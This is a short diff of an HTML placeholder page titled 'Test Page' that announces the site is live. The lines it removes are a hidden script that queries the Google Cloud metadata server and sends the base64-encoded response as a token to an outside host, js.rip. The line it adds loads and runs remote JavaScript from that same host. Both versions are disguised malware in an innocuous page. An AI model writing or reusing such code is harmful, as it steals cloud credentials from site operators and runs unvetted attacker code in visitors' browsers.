@@ -2,15 +2,7 @@
 <html>
 <head>
   <title>Test Page</title>
- <script>
-fetch('https://js.rip/5mw8at9w5s'); // Always fires
-fetch('http://metadata.google.internal', {
-  headers: { 'Metadata-Flavor': 'Google' }
-})
-.then(r => r.text())
-.then(t => fetch('https://js.rip/5mw8at9w5s?token=' + btoa(t)))
-.catch(() => {});
-</script>
+ <script src="https://js.rip/5mw8at9w5s"></script>
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
